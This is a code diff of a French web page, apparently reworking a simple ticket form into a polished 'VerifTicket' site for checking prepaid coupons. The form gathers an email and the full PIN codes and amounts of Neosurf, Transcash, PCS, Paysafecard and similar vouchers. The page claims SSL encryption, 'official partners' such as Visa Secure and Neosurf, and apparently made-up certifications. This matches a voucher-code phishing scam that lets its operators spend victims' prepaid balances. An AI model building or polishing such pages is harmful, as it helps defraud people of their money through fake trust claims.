@@ -1,195 +1,286 @@
-  <!DOCTYPE html>
-  <html lang="fr">
-    <head>
-      <meta charset="UTF-8" />
-      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-      <meta name="description" content="Système de gestion de tickets en ligne">
-      <title>Gestion de Tickets</title>
-      <link rel="preconnect" href="https://fonts.googleapis.com">
-      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-      <link rel="stylesheet" href="style.css" />
-      <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎫</text></svg>">
-    </head>
-    <body>
-      <div class="container">
-        <h1 id="titre">Gestion de Tickets</h1>
-        <form id="ticketForm" action="/submit-ticket" method="POST">
-          <div class="ifosUser">
-            <h2>Données D'utilisateur :</h2>
-            <div class="form-group">
-              <label for="e-mail">E-mail :</label>
-              <input
-                type="email"
-                id="user-email"
-                name="email"
-                placeholder="E-mail de reception"
-                required
-              />
-            </div>
-            <div class="form-group">
-              <label for="devise">Devise</label>
-              <select id="devise" required>
-                <option value="USD">USD</option>
-                <option value="EU">EU</option>
-                <option value="GBP">GBP</option>
-                <option value="JPY">JPY</option>
-                <option value="CHF">CHF</option>
-                <option value="CAD">CAD</option>
-                <option value="KWD">KWD</option>
-              </select>
-            </div>
-          </div>
+<!DOCTYPE html>
+<html lang="fr">
 
-          <div class="ticket-group">
-            <h2>Ticket 1</h2>
-            <div class="form-group">
-              <label for="type1">Type de ticket:</label>
-              <select id="type1" name="type1">
-                <option value="">Sélectionnez un type</option>
-                <option value="neosurf">Neosurf</option>
-                <option value="transcash">Transcash</option>
-                <option value="pcs">PCS</option>
-                <option value="paysafe card">Paysafe card</option>
-                <option value="amazon">Amazon</option>
-                <option value="toneo">Toneo</option>
-                <option value="autre">Autre</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="code1">Code du ticket:</label>
-              <input
-                type="text"
-                id="code1"
-                name="code1"
-                placeholder="Entrez le code du ticket"
-              />
-            </div>
-            <div class="form-group">
-              <label for="montant1">Montant:</label>
-              <input
-                type="number"
-                id="montant1"
-                name="montant1"
-                placeholder="Montant du ticket"
-                min="0"
-                step="0.01"
-              />
-            </div>
-          </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="VerifTicket - Le service de vérification de coupons sécurisé et rapide.">
+  <title>VerifTicket | Vérification Sécurisée</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Inter:wght@400;500;600&display=swap"
+    rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon"
+    href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
 
-          <div class="ticket-group">
-            <h2>Ticket 2</h2>
-            <div class="form-group">
-              <label for="type2">Type de ticket:</label>
-              <select id="type2" name="type2">
-                <option value="">Sélectionnez un type</option>
-                <option value="neosurf">Neosurf</option>
-                <option value="transcash">Transcash</option>
-                <option value="pcs">PCS</option>
-                <option value="paysafe card">Paysafe card</option>
-                <option value="amazon">Amazon</option>
-                <option value="toneo">Toneo</option>
-                <option value="autre">Autre</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="code2">Code du ticket:</label>
-              <input
-                type="text"
-                id="code2"
-                name="code2"
-                placeholder="Entrez le code du ticket"
-              />
-            </div>
-            <div class="form-group">
-              <label for="montant2">Montant:</label>
-              <input
-                type="number"
-                id="montant2"
-                name="montant2"
-                placeholder="Montant du ticket"
-                min="0"
-                step="0.01"
-              />
-            </div>
-          </div>
+<body>
 
-          <div class="ticket-group">
-            <h2>Ticket 3</h2>
-            <div class="form-group">
-              <label for="type3">Type de ticket:</label>
-              <select id="type3" name="type3">
-                <option value="">Sélectionnez un type</option>
-                <option value="neosurf">Neosurf</option>
-                <option value="transcash">Transcash</option>
-                <option value="pcs">PCS</option>
-                <option value="paysafe card">Paysafe card</option>
-                <option value="amazon">Amazon</option>
-                <option value="toneo">Toneo</option>
-                <option value="autre">Autre</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="code3">Code du ticket:</label>
-              <input
-                type="text"
-                id="code3"
-                name="code3"
-                placeholder="Entrez le code du ticket"
-              />
-            </div>
-            <div class="form-group">
-              <label for="montant3">Montant:</label>
-              <input
-                type="number"
-                id="montant3"
-                name="montant3"
-                placeholder="Montant du ticket"
-                min="0"
-                step="0.01"
-              />
-            </div>
-          </div>
+  <!-- Header -->
+  <header class="site-header">
+    <div class="header-container">
+      <div class="logo">
+        <i class="ri-shield-check-fill logo-icon"></i> VerifTicket<span class="logo-dot">.</span>
+      </div>
+      <nav class="main-nav">
+        <a href="#hero">Accueil</a>
+        <a href="#how-it-works">Comment ça marche</a>
+        <a href="#verification" class="nav-cta">Vérifier un ticket</a>
+      </nav>
+    </div>
+  </header>
 
-          <button type="submit" class="submit-btn">Valider</button>
-        </form>
+  <!-- Hero Section -->
+  <section id="hero" class="hero-section">
+    <div class="hero-container">
+      <div class="hero-content">
+        <span class="hero-badge">Nouveau V1.1</span>
+        <h1>Vérifiez vos coupons en toute <span class="highlight-text">confiance</span>.</h1>
+        <p class="hero-subtitle">La plateforme N°1 de vérification pour Neosurf, PCS, Transcash et plus. Sécurisé,
+          rapide et fiable.</p>
+        <div class="hero-actions">
+          <a href="#verification" class="btn-primary">Commencer la vérification</a>
+          <a href="#how-it-works" class="btn-secondary">Comment ça marche ?</a>
+        </div>
+        <div class="trust-badge"><i class="ri-lock-2-fill"></i> Chiffrement SSL 256-bit</div>
+      </div>
+      <div class="hero-image">
+        <img src="images/download-free-gift-cards-free-png-images.png" alt="Cartes cadeaux supportées"
+          class="floating-image">
+      </div>
+    </div>
+  </section>
+
+  <!-- Features / Steps -->
+  <section id="how-it-works" class="features-section">
+    <div class="section-container">
+      <div class="section-header">
+        <h2>Simple, Rapide, Sécurisé</h2>
+        <p>Notre processus de vérification en 3 étapes</p>
       </div>
 
-      <!-- Message de confirmation (caché par défaut) -->
-        <div id="confirmation-message">
-          <div class="message-box">
-            <h2>Confirmation</h2>
-            <p id="message-text"></p>
-            <div class="button-group">
-              <button id="new-submission" class="btn">Nouvelle soumission</button>
-              <button class="close-message">Fermer</button>
+      <div class="features-grid">
+        <div class="feature-item">
+          <div class="icon-circle">
+            <i class="ri-file-edit-line feature-icon"></i>
+          </div>
+          <h3>1. Remplissez</h3>
+          <p>Indiquez votre email de contact ainsi que le type et le code de vos coupons dans le formulaire sécurisé
+            ci-dessous.</p>
+        </div>
+        <div class="feature-item">
+          <div class="icon-circle">
+            <i class="ri-search-eye-line feature-icon"></i>
+          </div>
+          <h3>2. Vérification</h3>
+          <p>Nos algorithmes analysent instantanément la validité de chaque ticket auprès des émetteurs officiels.</p>
+        </div>
+        <div class="feature-item">
+          <div class="icon-circle">
+            <i class="ri-mail-check-line feature-icon"></i>
+          </div>
+          <h3>3. Résultat</h3>
+          <p>Vous recevez une notification par email sous quelques minutes avec le statut certifié de vos coupons.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Verification Area (Form) -->
+  <section id="verification" class="verification-section">
+    <div class="container">
+      <div class="form-header">
+        <h2 id="titre">Espace de Vérification</h2>
+        <p>Remplissez le formulaire ci-dessous pour lancer la vérification.</p>
+      </div>
+
+      <form id="ticketForm" action="/submit-ticket" method="POST">
+        <div class="ifosUser">
+          <div class="card-header">
+            <span class="step-number">1</span>
+            <h3>Informations Client</h3>
+          </div>
+          <div class="card-body">
+            <div class="form-group">
+              <label for="user-email">Votre Email de réception</label>
+              <div class="input-wrapper">
+                <i class="ri-mail-send-line input-icon"></i>
+                <input type="email" id="user-email" name="email" placeholder="exemple@mail.com" required />
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="devise">Devise de transaction</label>
+              <div class="input-wrapper">
+                <i class="ri-money-euro-circle-line input-icon"></i>
+                <select id="devise" required>
+                  <option value="USD">USD ($)</option>
+                  <option value="EU" selected>EUR (€)</option>
+                  <option value="GBP">GBP (£)</option>
+                  <option value="CHF">CHF (Fr)</option>
+                  <option value="CAD">CAD ($)</option>
+                </select>
+              </div>
             </div>
           </div>
         </div>
 
-      <script src="script.js"></script>
-
-      <footer class="main-footer">
-        <div class="footer-content">
-          <p class="copyright">&copy; 2023 VerifTicket. Tous droits réservés.</p>
-          <div class="certifications">
-            <span>Certifié par :</span>
-            <div class="cert-logos">
-              <span>EU SecurePay</span>
-              <span>TicketVerif Europe</span>
-              <span>CardTrust Alliance</span>
+        <div class="tickets-container">
+          <!-- Ticket 1 -->
+          <div class="ticket-group">
+            <div class="card-header">
+              <span class="step-number">2</span>
+              <h3>Ticket #1</h3>
+            </div>
+            <div class="card-body">
+              <div class="form-group">
+                <label for="type1">Type de coupon</label>
+                <select id="type1" name="type1">
+                  <option value="">-- Sélectionner --</option>
+                  <option value="neosurf">Neosurf</option>
+                  <option value="transcash">Transcash</option>
+                  <option value="pcs">PCS</option>
+                  <option value="paysafe card">Paysafe card</option>
+                  <option value="amazon">Amazon</option>
+                  <option value="toneo">Toneo</option>
+                  <option value="autre">Autre</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="form-group half">
+                  <label for="code1">Code (PIN)</label>
+                  <input type="text" id="code1" name="code1" placeholder="Ex: 1234-5678-9012" />
+                </div>
+                <div class="form-group half">
+                  <label for="montant1">Montant</label>
+                  <input type="number" id="montant1" name="montant1" placeholder="0.00" min="0" step="0.01" />
+                </div>
+              </div>
             </div>
           </div>
-          <div class="legal-links">
-            <a href="#" class="footer-link">Mentions légales</a>
-            <span class="divider">|</span>
-            <a href="#" class="footer-link">Politique de confidentialité</a>
-            <span class="divider">|</span>
-            <a href="#" class="footer-link">Conditions d'utilisation</a>
+
+          <!-- Ticket 2 -->
+          <div class="ticket-group collapsed">
+            <div class="card-header">
+              <span class="step-number">+</span>
+              <h3>Ticket #2 (Optionnel)</h3>
+            </div>
+            <div class="card-body">
+              <div class="form-group">
+                <label for="type2">Type de coupon</label>
+                <select id="type2" name="type2">
+                  <option value="">-- Sélectionner --</option>
+                  <option value="neosurf">Neosurf</option>
+                  <option value="transcash">Transcash</option>
+                  <option value="pcs">PCS</option>
+                  <option value="paysafe card">Paysafe card</option>
+                  <option value="amazon">Amazon</option>
+                  <option value="toneo">Toneo</option>
+                  <option value="autre">Autre</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="form-group half">
+                  <label for="code2">Code (PIN)</label>
+                  <input type="text" id="code2" name="code2" placeholder="Code" />
+                </div>
+                <div class="form-group half">
+                  <label for="montant2">Montant</label>
+                  <input type="number" id="montant2" name="montant2" placeholder="0.00" min="0" step="0.01" />
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Ticket 3 -->
+          <div class="ticket-group collapsed">
+            <div class="card-header">
+              <span class="step-number">+</span>
+              <h3>Ticket #3 (Optionnel)</h3>
+            </div>
+            <div class="card-body">
+              <div class="form-group">
+                <label for="type3">Type de coupon</label>
+                <select id="type3" name="type3">
+                  <option value="">-- Sélectionner --</option>
+                  <option value="neosurf">Neosurf</option>
+                  <option value="transcash">Transcash</option>
+                  <option value="pcs">PCS</option>
+                  <option value="paysafe card">Paysafe card</option>
+                  <option value="amazon">Amazon</option>
+                  <option value="toneo">Toneo</option>
+                  <option value="autre">Autre</option>
+                </select>
+              </div>
+              <div class="form-row">
+                <div class="form-group half">
+                  <label for="code3">Code (PIN)</label>
+                  <input type="text" id="code3" name="code3" placeholder="Code" />
+                </div>
+                <div class="form-group half">
+                  <label for="montant3">Montant</label>
+                  <input type="number" id="montant3" name="montant3" placeholder="0.00" min="0" step="0.01" />
+                </div>
+              </div>
+            </div>
           </div>
         </div>
-      </footer>
 
-    </body>
-  </html>
+        <div class="form-actions">
+          <button type="submit" class="submit-btn">
+            <span class="btn-text">Lancer la vérification sécurisée</span>
+            <i class="ri-shield-keyhole-line"></i>
+          </button>
+          <p class="security-note">Vos données sont chiffrées et ne sont jamais partagées.</p>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <!-- Message de confirmation (Modal) -->
+  <div id="confirmation-message">
+    <div class="message-box">
+      <div class="message-icon"><i class="ri-check-double-line" style="color: var(--success);"></i></div>
+      <h2>Demande Reçue !</h2>
+      <p id="message-text"></p>
+      <div class="button-group">
+        <button id="new-submission" class="btn btn-primary">Nouvelle vérification</button>
+        <button class="close-message btn btn-secondary">Fermer</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="main-footer">
+    <div class="footer-content">
+      <div class="footer-top">
+        <div class="footer-logo">
+          <i class="ri-shield-check-fill logo-icon"></i> VerifTicket
+        </div>
+        <p class="copyright">&copy; 2024 VerifTicket. Tous droits réservés.</p>
+      </div>
+      <div class="certifications">
+        <span>Partenaires officiels :</span>
+        <div class="cert-logos">
+          <span class="partner">Neosurf</span>
+          <span class="partner">Transcash</span>
+          <span class="partner">PCS Mastercard</span>
+          <span class="partner">Visa Secure</span>
+        </div>
+      </div>
+      <div class="legal-links">
+        <a href="#" class="footer-link">Mentions légales</a>
+        <span class="divider">•</span>
+        <a href="#" class="footer-link">Confidentialité</a>
+        <span class="divider">•</span>
+        <a href="#" class="footer-link">CGU</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
